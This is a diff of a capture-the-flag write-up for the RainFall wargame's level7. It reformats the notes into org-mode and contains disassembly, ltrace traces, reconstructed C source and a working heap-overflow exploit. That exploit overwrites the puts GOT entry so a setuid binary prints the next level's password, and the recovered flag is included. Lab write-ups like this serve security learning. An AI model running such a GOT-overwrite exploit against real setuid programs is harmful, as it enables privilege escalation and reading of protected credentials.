@@ -1,11 +1,23 @@
-let's see what we got
+#+title: walkthrough
+*  Data Gathering
+#+begin_src shell
 level7@RainFall:~$ ls -lhtr
 total 8.0K
 -rwsr-s---+ 1 level8 users 5.6K Mar  9  2016 level7
-# let's see the functions
-level7@RainFall:~$ gdb --batch -ex "file level7" -ex "info functions"
-All defined functions:
+#+end_src
+** Strings
+#+begin_src shell
+level7@RainFall:~$ readelf -p .rodata ./level7
 
+String dump of section '.rodata':
+  [     8]  %s - %d^J -> may be printf format
+  [    11]  r -> fopen -> flag
+  [    13]  /home/user/level8/.pass -> fopen -> path
+  [    2b]  ~~ -> puts string
+#+end_src
+** Functions
+#+begin_src shell
+level7@RainFall:~$ gdb --batch -ex "file level7" -ex "info functions"
 Non-debugging symbols:
 0x0804836c  _init
 0x080483b0  printf
@@ -29,110 +41,165 @@ Non-debugging symbols:
 0x08048440  _start
 0x08048470  __do_global_dtors_aux
 0x080484d0  frame_dummy
-0x080484f4  m 
+0x080484f4  m
 0x08048521  main
 0x08048610  __libc_csu_init
 0x08048680  __libc_csu_fini
 0x08048682  __i686.get_pc_thunk.bx
 0x08048690  __do_global_ctors_aux
 0x080486bc  _fini
-# let's see main and m
-level7@RainFall:~$ gdb --batch -ex "file level7" -ex "set disassembly-flavor intel" -ex "disassemble main"
-Dump of assembler code for function main:
-   0x08048521 <+0>:	push   ebp
-   0x08048522 <+1>:	mov    ebp,esp
-   0x08048524 <+3>:	and    esp,0xfffffff0
-   0x08048527 <+6>:	sub    esp,0x20
-   0x0804852a <+9>:	mov    DWORD PTR [esp],0x8
-   0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
-   0x08048536 <+21>:	mov    DWORD PTR [esp+0x1c],eax
-   0x0804853a <+25>:	mov    eax,DWORD PTR [esp+0x1c]
-   0x0804853e <+29>:	mov    DWORD PTR [eax],0x1
-    0x08048544 <+35>:	mov    DWORD PTR [esp],0x8
-   0x0804854b <+42>:	call   0x80483f0 <malloc@plt>
-   0x08048550 <+47>:	mov    edx,eax
-   0x08048552 <+49>:	mov    eax,DWORD PTR [esp+0x1c]
-   0x08048556 <+53>:	mov    DWORD PTR [eax+0x4],edx
-   0x08048559 <+56>:	mov    DWORD PTR [esp],0x8
-   0x08048560 <+63>:	call   0x80483f0 <malloc@plt>
-   0x08048565 <+68>:	mov    DWORD PTR [esp+0x18],eax
-   0x08048569 <+72>:	mov    eax,DWORD PTR [esp+0x18]
-   0x0804856d <+76>:	mov    DWORD PTR [eax],0x2
-   0x08048573 <+82>:	mov    DWORD PTR [esp],0x8
-   0x0804857a <+89>:	call   0x80483f0 <malloc@plt>
-   0x0804857f <+94>:	mov    edx,eax
-   0x08048581 <+96>:	mov    eax,DWORD PTR [esp+0x18]
-   0x08048585 <+100>:	mov    DWORD PTR [eax+0x4],edx
-   0x08048588 <+103>:	mov    eax,DWORD PTR [ebp+0xc]
-   0x0804858b <+106>:	add    eax,0x4
-   0x0804858e <+109>:	mov    eax,DWORD PTR [eax]
-   0x08048590 <+111>:	mov    edx,eax
-   0x08048592 <+113>:	mov    eax,DWORD PTR [esp+0x1c]
-   0x08048596 <+117>:	mov    eax,DWORD PTR [eax+0x4]
-   0x08048599 <+120>:	mov    DWORD PTR [esp+0x4],edx
-   0x0804859d <+124>:	mov    DWORD PTR [esp],eax
-   0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>
-   0x080485a5 <+132>:	mov    eax,DWORD PTR [ebp+0xc]
-   0x080485a8 <+135>:	add    eax,0x8
-   0x080485ab <+138>:	mov    eax,DWORD PTR [eax]
-   0x080485ad <+140>:	mov    edx,eax
-   0x080485af <+142>:	mov    eax,DWORD PTR [esp+0x18]
-   0x080485b3 <+146>:	mov    eax,DWORD PTR [eax+0x4]
-   0x080485b6 <+149>:	mov    DWORD PTR [esp+0x4],edx
-   0x080485ba <+153>:	mov    DWORD PTR [esp],eax
-   0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>
-   0x080485c2 <+161>:	mov    edx,0x80486e9
-   0x080485c7 <+166>:	mov    eax,0x80486eb
-   0x080485cc <+171>:	mov    DWORD PTR [esp+0x4],edx
-   0x080485d0 <+175>:	mov    DWORD PTR [esp],eax
-   0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
-   0x080485d8 <+183>:	mov    DWORD PTR [esp+0x8],eax
-   0x080485dc <+187>:	mov    DWORD PTR [esp+0x4],0x44
-   0x080485e4 <+195>:	mov    DWORD PTR [esp],0x8049960
-   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
-   0x080485f0 <+207>:	mov    DWORD PTR [esp],0x8048703
-   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
-   0x080485fc <+219>:	mov    eax,0x0
-   0x08048601 <+224>:	leave  
-   0x08048602 <+225>:	ret    
-End of assembler dump.
-level7@RainFall:~$ ./level7
-Segmentation fault (core dumped)
-level7@RainFall:~$ ./level7 a
-Segmentation fault (core dumped)
-level7@RainFall:~$ ltrace ./level7
-__libc_start_main(0x8048521, 1, 0xbffffd14, 0x8048610, 0x8048680 <unfinished ...>
-malloc(8)                                             = 0x0804a008
-malloc(8)                                             = 0x0804a018
-malloc(8)                                             = 0x0804a028
-malloc(8)                                             = 0x0804a038
-strcpy(0x0804a018, NULL <unfinished ...>
---- SIGSEGV (Segmentation fault) ---
-+++ killed by SIGSEGV +++
-level7@RainFall:~$ gdb --batch -ex "file level7" -ex "set disassembly-flavor intel" -ex "disassemble m"
-Dump of assembler code for function m:
-   0x080484f4 <+0>:	push   ebp
-   0x080484f5 <+1>:	mov    ebp,esp
-   0x080484f7 <+3>:	sub    esp,0x18
-   0x080484fa <+6>:	mov    DWORD PTR [esp],0x0
-   0x08048501 <+13>:	call   0x80483d0 <time@plt>
-   0x08048506 <+18>:	mov    edx,0x80486e0
-   0x0804850b <+23>:	mov    DWORD PTR [esp+0x8],eax
-   0x0804850f <+27>:	mov    DWORD PTR [esp+0x4],0x8049960
-   0x08048517 <+35>:	mov    DWORD PTR [esp],edx
-   0x0804851a <+38>:	call   0x80483b0 <printf@plt>
-   0x0804851f <+43>:	leave  
-   0x08048520 <+44>:	ret    
-End of assembler dump.
-## Looks like need two params for work properly. need to get what to do to make work fopen.
-level7@RainFall:~$ readelf -p .rodata ./level7
+#+end_src
 
-String dump of section '.rodata':
-  [     8]  %s - %d^J -> may be printf format
-  [    11]  r -> fopen -> flag
-  [    13]  /home/user/level8/.pass -> fopen -> path
-  [    2b]  ~~ -> puts string
-  
+* Binary analysis
+
+** Code 
+#+begin_src shell
+  level7@RainFall:~$ gdb --batch -ex "file level7" -ex "set disassembly-flavor intel" -ex "disassemble main"
+  Dump of assembler code for function main:
+     0x08048521 <+0>:	push   ebp
+     0x08048522 <+1>:	mov    ebp,esp
+     0x08048524 <+3>:	and    esp,0xfffffff0
+     0x08048527 <+6>:	sub    esp,0x20
+     0x0804852a <+9>:	mov    DWORD PTR [esp],0x8
+     0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
+     0x08048536 <+21>:	mov    DWORD PTR [esp+0x1c],eax
+     0x0804853a <+25>:	mov    eax,DWORD PTR [esp+0x1c]
+     0x0804853e <+29>:	mov    DWORD PTR [eax],0x1
+     0x08048544 <+35>:	mov    DWORD PTR [esp],0x8
+     0x0804854b <+42>:	call   0x80483f0 <malloc@plt>
+     0x08048550 <+47>:	mov    edx,eax
+     0x08048552 <+49>:	mov    eax,DWORD PTR [esp+0x1c]
+     0x08048556 <+53>:	mov    DWORD PTR [eax+0x4],edx
+     0x08048559 <+56>:	mov    DWORD PTR [esp],0x8
+     0x08048560 <+63>:	call   0x80483f0 <malloc@plt>
+     0x08048565 <+68>:	mov    DWORD PTR [esp+0x18],eax
+     0x08048569 <+72>:	mov    eax,DWORD PTR [esp+0x18]
+     0x0804856d <+76>:	mov    DWORD PTR [eax],0x2
+     0x08048573 <+82>:	mov    DWORD PTR [esp],0x8
+     0x0804857a <+89>:	call   0x80483f0 <malloc@plt>
+     0x0804857f <+94>:	mov    edx,eax
+     0x08048581 <+96>:	mov    eax,DWORD PTR [esp+0x18]
+     0x08048585 <+100>:	mov    DWORD PTR [eax+0x4],edx
+     0x08048588 <+103>:	mov    eax,DWORD PTR [ebp+0xc]
+     0x0804858b <+106>:	add    eax,0x4
+     0x0804858e <+109>:	mov    eax,DWORD PTR [eax]
+     0x08048590 <+111>:	mov    edx,eax
+     0x08048592 <+113>:	mov    eax,DWORD PTR [esp+0x1c]
+     0x08048596 <+117>:	mov    eax,DWORD PTR [eax+0x4]
+     0x08048599 <+120>:	mov    DWORD PTR [esp+0x4],edx
+     0x0804859d <+124>:	mov    DWORD PTR [esp],eax
+     0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>
+     0x080485a5 <+132>:	mov    eax,DWORD PTR [ebp+0xc]
+     0x080485a8 <+135>:	add    eax,0x8
+     0x080485ab <+138>:	mov    eax,DWORD PTR [eax]
+     0x080485ad <+140>:	mov    edx,eax
+     0x080485af <+142>:	mov    eax,DWORD PTR [esp+0x18]
+     0x080485b3 <+146>:	mov    eax,DWORD PTR [eax+0x4]
+     0x080485b6 <+149>:	mov    DWORD PTR [esp+0x4],edx
+     0x080485ba <+153>:	mov    DWORD PTR [esp],eax
+     0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>
+     0x080485c2 <+161>:	mov    edx,0x80486e9
+     0x080485c7 <+166>:	mov    eax,0x80486eb
+     0x080485cc <+171>:	mov    DWORD PTR [esp+0x4],edx
+     0x080485d0 <+175>:	mov    DWORD PTR [esp],eax
+     0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
+     0x080485d8 <+183>:	mov    DWORD PTR [esp+0x8],eax
+     0x080485dc <+187>:	mov    DWORD PTR [esp+0x4],0x44
+     0x080485e4 <+195>:	mov    DWORD PTR [esp],0x8049960
+     0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
+     0x080485f0 <+207>:	mov    DWORD PTR [esp],0x8048703
+     0x080485f7 <+214>:	call   0x8048400 <puts@plt>
+     0x080485fc <+219>:	mov    eax,0x0
+     0x08048601 <+224>:	leave  
+     0x08048602 <+225>:	ret    
+  End of assembler dump.
+  level7@RainFall:~$ ./level7
+  Segmentation fault (core dumped)
+  level7@RainFall:~$ ./level7 a
+  Segmentation fault (core dumped)
+  level7@RainFall:~$ ltrace ./level7
+  __libc_start_main(0x8048521, 1, 0xbffffd14, 0x8048610, 0x8048680 <unfinished ...>
+  malloc(8)                                             = 0x0804a008
+  malloc(8)                                             = 0x0804a018
+  malloc(8)                                             = 0x0804a028
+  malloc(8)                                             = 0x0804a038
+  strcpy(0x0804a018, NULL <unfinished ...>
+  --- SIGSEGV (Segmentation fault) ---
+  +++ killed by SIGSEGV +++
+  level7@RainFall:~$ gdb --batch -ex "file level7" -ex "set disassembly-flavor intel" -ex "disassemble m"
+  Dump of assembler code for function m:
+     0x080484f4 <+0>:	push   ebp
+     0x080484f5 <+1>:	mov    ebp,esp
+     0x080484f7 <+3>:	sub    esp,0x18
+     0x080484fa <+6>:	mov    DWORD PTR [esp],0x0
+     0x08048501 <+13>:	call   0x80483d0 <time@plt>
+     0x08048506 <+18>:	mov    edx,0x80486e0
+     0x0804850b <+23>:	mov    DWORD PTR [esp+0x8],eax
+     0x0804850f <+27>:	mov    DWORD PTR [esp+0x4],0x8049960
+     0x08048517 <+35>:	mov    DWORD PTR [esp],edx
+     0x0804851a <+38>:	call   0x80483b0 <printf@plt>
+     0x0804851f <+43>:	leave  
+     0x08048520 <+44>:	ret    
+  End of assembler dump.
+
+#+end_src
+
+[[source]]
+
+* Estrategy
+May i need to call m() after read from file, i need to change  puts got to point m function.
+## for make this i need to write on GOT TABLE.
+i will use the heap overflow for mod the vaue of the GOT.
+### I need to access the where is save it
+#+begin_src shell
+level7@RainFall:~$ objdump -R ./level7
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE 
+08049928 R_386_JUMP_SLOT   puts
+#+end_src
+
+# change for this value
+###  and the value that i want to change with
+#+begin_src shell
+(gdb) p m
+$1 = {<text variable, no debug info>} 0x80484f4 <m>
+0x080484f4
+#+end_src
+#let's use the strcpy to change the address point dst of the second strcpy.
+# https://wiremask.eu/tools/buffer-overflow-pattern-generator/?
+#+begin_src shell
+level7@RainFall:~$ ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...) = 0x0804a018
+strcpy(0x37614136, NULL <unfinished ...> -> look like the address change it
+strcpy(0x0804a038, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...) = 0x0804a038 -> this was the not overflow one.
+
+#+end_src
+## the overflow offset is 20 bytes. address to put 08049928 -> tx little endian -> 28 99 04 08
+payload first argument will be "a" * 20 + \x28\x99\04\08
+#+begin_src shell
+level7@RainFall:~$ ltrace ./level7 $(python -c 'print "a" * 20 + "\x28\x99\x04\x08"') 
+strcpy(0x0804a018, "aaaaaaaaaaaaaaaaaaaa(\231\004\b") = 0x0804a018
+strcpy(0x08049928, NULL <unfinished ...> # The adderss is fine.
+#+end_src
+
+## Look like the payload is working fine
+#+begin_src shell
+
+#+end_src
+level7@RainFall:~$ 
+## write on tho got the address of m -> 0x80484f4 -> tx little endian \xf4\x84\x04\x08Do 
+because the open fail cause not change suid when ltrace, gdb ... couldn't with ltrace just launched.
+#+begin_src shell
+level7@RainFall:~$ ./level7 $(python -c 'print "a" * 20 + "\x28\x99\x04\x08"')  $(printf '\xf4\x84\x04\x08')
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1746178439
+#+end_src
+## the first line is the flag
+# flag/pass level8=5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+level7@RainFall:~$ su level8
+Password: 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ 
+#+begin_src shell
 level7@RainFall:~$ ltrace ./level7 a b # similar to gdb execute as level7 not level8
 __libc_start_main(0x8048521, 3, 0xbffffd04, 0x8048610, 0x8048680 <unfinished ...>
 malloc(8)                                             = 0x0804a008
@@ -146,75 +213,6 @@ fgets( <unfinished ...>
 --- SIGSEGV (Segmentation fault) ---
 +++ killed by SIGSEGV +++
 
-https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf
-#include <stdlib.h>
-#include <stdio.h>
-#include <string.h>
-#include <time.h>
+#+end_src
 
-char	c[68];
-
-void	m(void)
-{
-	printf("%s - %d\n", c, (int)time(0));
-}
-
-int		main(int ac, char **av)
-{
-	int		*a;
-	int		*b;
-
-	a = malloc(8);
-	a[0] = 1;
-	a[1] = (int)malloc(8);
-
-	b = malloc(8);
-	b[0] = 2;
-	b[1] = (int)malloc(8);
-
-	strcpy((char *)a[1], av[1]);
-	strcpy((char *)b[1], av[2]);
-	
-	fgets(c, 68, fopen("/home/user/level8/.pass", "r"));
-
-	puts("~~");
-
-	return (0);
-}
-## May i need to call m() before read from file, i need to change  puts got to point m function.
-## for make this i need to write on GOT TABLE.
-### I need to access the where is save it
-
-level7@RainFall:~$ objdump -R ./level7
-DYNAMIC RELOCATION RECORDS
-OFFSET   TYPE              VALUE 
-08049928 R_386_JUMP_SLOT   puts
-# change for this value
-###  and the value that i want to change with
-(gdb) p m
-$1 = {<text variable, no debug info>} 0x80484f4 <m>
-0x080484f4
-#let's use the strcpy to change the address point dst of the second strcpy.
-# https://wiremask.eu/tools/buffer-overflow-pattern-generator/?
-level7@RainFall:~$ ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
-strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...) = 0x0804a018
-strcpy(0x37614136, NULL <unfinished ...> -> look like the address change it
-strcpy(0x0804a038, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...) = 0x0804a038 -> this was the not overflow one.
-## the overflow offset is 20 bytes. address to put 08049928 -> tx little endian -> 28 99 04 08
-payload first argument will be "a" * 20 + \x28\x99\04\08
-level7@RainFall:~$ ltrace ./level7 $(python -c 'print "a" * 20 + "\x28\x99\x04\x08"') 
-strcpy(0x0804a018, "aaaaaaaaaaaaaaaaaaaa(\231\004\b") = 0x0804a018
-strcpy(0x08049928, NULL <unfinished ...>
-## Look like the payload is working fine
-level7@RainFall:~$ 
-## write on tho got the address of m -> 0x80484f4 -> tx little endian \xf4\x84\x04\x08Do 
-because the open fail cause not change suid when ltrace, gdb ... couldn't with ltrace just launched.
-level7@RainFall:~$ ./level7 $(python -c 'print "a" * 20 + "\x28\x99\x04\x08"')  $(printf '\xf4\x84\x04\x08')
-5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
- - 1746178439
-## the first line is the flag
-# flag/pass level8=5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
-level7@RainFall:~$ su level8
-Password: 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
-level8@RainFall:~$ 
- 
+# let's see the functions
